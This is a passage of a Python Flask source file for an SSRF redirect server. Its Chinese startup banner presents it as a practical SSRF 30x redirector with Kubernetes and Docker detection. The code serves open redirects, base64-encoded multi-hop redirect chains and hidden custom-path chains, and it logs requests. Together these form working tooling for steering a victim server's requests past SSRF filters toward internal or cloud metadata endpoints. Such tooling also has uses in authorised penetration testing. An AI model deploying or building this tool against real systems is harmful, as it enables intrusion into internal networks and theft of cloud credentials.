    status_code = int(request.args.get('code', CONFIG['default_status_code']))
    target_url = request.args.get('url', '')
    if status_code not in VALID_30X_CODES: status_code = CONFIG['default_status_code']
    if not target_url:
        response = make_response('No target URL specified', 400)
    else:
        log_entry['redirect_url'] = target_url
        response = make_response(redirect(target_url, code=status_code))
    
    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route('/c', methods=SUPPORTED_METHODS)
def stateless_chain_handler():
    log_entry = log_request()
    b64_data = request.args.get('b')
    if not b64_data:
        response = make_response('Missing chain payload', 400)
    else:
        try:
            padding = '=' * ((4 - len(b64_data) % 4) % 4)
            safe_b64 = b64_data.replace('-', '+').replace('_', '/') + padding
            decoded_bytes = base64.b64decode(safe_b64)
            chain_data = json.loads(decoded_bytes.decode('utf-8'))
            
            steps = chain_data.get('s', [])
            if not steps:
                response = make_response('Empty chain steps', 400)
            else:
                current_step = steps.pop(0)
                status_code = int(current_step.get('c', 302))
                target_url = current_step.get('t', '')
                
                if steps:
                    remaining_data = {'s': steps}
                    remaining_json = json.dumps(remaining_data, separators=(',', ':'))
                    remaining_b64 = base64.urlsafe_b64encode(remaining_json.encode('utf-8')).decode('utf-8').rstrip('=')
                    
                    host_url = request.url_root.rstrip('/')
                    if not target_url.startswith('http'): target_url = host_url
                    separator = '&' if '?' in target_url else '?'
                    next_url = f"{target_url}{separator}b={remaining_b64}"
                    if target_url.strip('/') == host_url.strip('/'): next_url = f"{host_url}/c?b={remaining_b64}"
                else:
                    next_url = target_url
                    
                log_entry['redirect_url'] = next_url
                response = make_response(redirect(next_url, code=status_code))
        except Exception as e:
            response = jsonify({'error': f'Chain decode failed: {str(e)}'})
            response.status_code = 400

    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route('/api/create_stateful_chain', methods=['POST'])
def create_stateful_chain():
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        data = request.get_json(force=True)
        steps_input = data.get('steps', [])
        final_target = data.get('final_target', '')
        base_url = data.get('base_url', request.url_root.rstrip('/'))
    except:
        return jsonify({'error': 'Invalid JSON'}), 400
    
    if not steps_input or len(steps_input) == 0:
        return jsonify({'error': 'At least one step required'}), 400
    
    for step in steps_input:
        path = step.get('path', '')
        if not path.startswith('/'):
            return jsonify({'error': f'Invalid path: {path}'}), 400
        reserved = ['/', '/r', '/c', '/api/logs', '/api/create_stateful_chain']
        if path in reserved or path.startswith('/api/'):
            return jsonify({'error': f'Path "{path}" is reserved'}), 400
        if path in PATH_MAP:
            return jsonify({'error': f'Path "{path}" already in use by another chain'}), 400
    
    chain_id = str(uuid.uuid4())[:8]
    steps = []
    for i, s in enumerate(steps_input):
        path = s['path']
        code = int(s.get('code', 302))
        if code not in VALID_30X_CODES:
            code = 302
        
        is_final = (i == len(steps_input) - 1)
        if is_final:
            if not final_target:
                return jsonify({'error': 'Final step requires final_target'}), 400
            target = final_target
        else:
            next_path = steps_input[i+1]['path']
            target = f"{base_url}{next_path}"
        
        steps.append({
            'path': path,
            'code': code,
            'target': target
        })
        PATH_MAP[path] = (chain_id, i)
    
    STATEFUL_CHAINS[chain_id] = {
        'id': chain_id,
        'steps': steps,
        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    first_url = f"{base_url}{steps[0]['path']}"
    return jsonify({'chain_id': chain_id, 'first_url': first_url, 'step_count': len(steps)})

@app.route('/<path:custom_path>', methods=SUPPORTED_METHODS)
def handle_stateful_path(custom_path):
    path = '/' + custom_path if not custom_path.startswith('/') else custom_path
    log_entry = log_request()
    
    if path in PATH_MAP:
        chain_id, step_index = PATH_MAP[path]
        chain = STATEFUL_CHAINS.get(chain_id)
        if not chain:
            response = make_response('Chain expired or not found', 404)
        else:
            step = chain['steps'][step_index]
            target = step['target']
            code = step['code']
            response = make_response(redirect(target, code=code))
            log_entry['redirect_url'] = target
            log_entry['extra_data'] = {'chain_id': chain_id, 'step_index': step_index, 'path': path}
    else:
        response = make_response('Not Found', 404)
    
    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route('/api/logs', methods=['GET', 'DELETE'])
def manage_logs():
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    if request.method == 'DELETE':
        LOGS.clear()
        return jsonify({'message': 'All logs cleared', 'total': len(LOGS)})
    return jsonify({'logs': LOGS[:50], 'total': len(LOGS)})

@app.route('/api/logs/<log_id>', methods=['DELETE'])
def delete_log_entry(log_id):
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    global LOGS
    original_len = len(LOGS)
    LOGS = [entry for entry in LOGS if entry['id'] != log_id]
    if len(LOGS) == original_len:
        return jsonify({'error': 'Log entry not found'}), 404
    return jsonify({'message': 'Log deleted', 'total': len(LOGS)})

if __name__ == '__main__':
    print(f"🚀 SSRF 实战 30x Redirector 引擎启动成功")
    print(f"📍 访问地址: http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"🛡️ 已深度集成 K8s / Docker 云原生 POST 自动化检测")
    print(f"🔒 有状态路径隐藏链已就绪")
    print(f"✏️ 基础跳转 / 智能链 / 有状态链 均已启用高级请求编辑")
    app.run(host=CONFIG['host'], port=CONFIG['port'], debug=False, threaded=True)
